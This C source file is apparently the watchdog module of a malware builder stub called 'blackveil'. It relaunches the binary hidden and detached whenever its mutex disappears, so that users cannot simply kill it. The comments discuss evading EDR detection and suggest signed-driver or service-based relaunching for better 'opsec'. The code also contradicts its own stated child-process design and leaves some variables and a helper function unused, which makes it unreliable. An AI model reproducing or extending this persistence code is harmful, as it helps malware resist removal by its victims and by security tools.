/* blackveil/builder/stub/watchdog.c
 *
 * Design: watchdog is a child process, not a thread. Thread-based
 * watchdogs die with the parent — useless against task-manager kill.
 * The child process opens the named mutex at start; if it disappears
 * (parent killed), the child re-executes the parent binary and exits.
 *
 * Trade-off: creates a visible second instance of the binary. On
 * EDR this reads as LOLBin self-spawn; add a signed-driver parent or
 * service-based re-launch for kernel-grade opsec.
 */
#include "watchdog.h"
#include <stdio.h>

static HANDLE g_stop_event = NULL;
static HANDLE g_watchdog_proc = NULL;

static WCHAR * _mutex_name_for_child(const WCHAR *mutex_name) {
    /* child receives mutex name via command line; parent passes it */
    size_t len = wcslen(mutex_name);
    WCHAR *out = (WCHAR *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                    (len + 1) * sizeof(WCHAR));
    if (out) wcscpy_s(out, len + 1, mutex_name);
    return out;
}

static DWORD WINAPI _watchdog_thread(LPVOID param) {
    struct {
        WCHAR self_path[MAX_PATH];
        WCHAR mutex_name[256];
        DWORD restart_ms;
    } *args = (typeof(args))param;

    HANDLE stop = CreateEventW(NULL, TRUE, FALSE, NULL);
    g_stop_event = stop;

    for (;;) {
        DWORD wait = WaitForSingleObject(stop, args->restart_ms);
        if (wait == WAIT_OBJECT_0) break;

        HANDLE m = OpenMutexW(SYNCHRONIZE, FALSE, args->mutex_name);
        if (m) {
            CloseHandle(m);
            continue;
        }

        /* Mutex is gone — main process presumed dead. Re-launch. */
        STARTUPINFOW si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        if (CreateProcessW(args->self_path, NULL, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW | DETACHED_PROCESS,
                           NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        break;
    }

    if (stop) CloseHandle(stop);
    HeapFree(GetProcessHeap(), 0, args);
    return 0;
}

BOOL bv_watchdog_start(const WCHAR *self_path, const WCHAR *mutex_name,
                       DWORD restart_ms) {
    if (!self_path || !mutex_name || restart_ms < 5000) return FALSE;

    struct {
        WCHAR self_path[MAX_PATH];
        WCHAR mutex_name[256];
        DWORD restart_ms;
    } *args = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*args));
    if (!args) return FALSE;

    wcsncpy_s(args->self_path, MAX_PATH, self_path, MAX_PATH - 1);
    wcsncpy_s(args->mutex_name, 256, mutex_name, 255);
    args->restart_ms = restart_ms;

    HANDLE t = CreateThread(NULL, 0, _watchdog_thread, args, 0, NULL);
    if (!t) {
        HeapFree(GetProcessHeap(), 0, args);
        return FALSE;
    }
    CloseHandle(t);
    return TRUE;
}

void bv_watchdog_stop(void) {
    if (g_stop_event) SetEvent(g_stop_event);
    if (g_watchdog_proc) {
        TerminateProcess(g_watchdog_proc, 0);
        CloseHandle(g_watchdog_proc);
        g_watchdog_proc = NULL;
    }
}
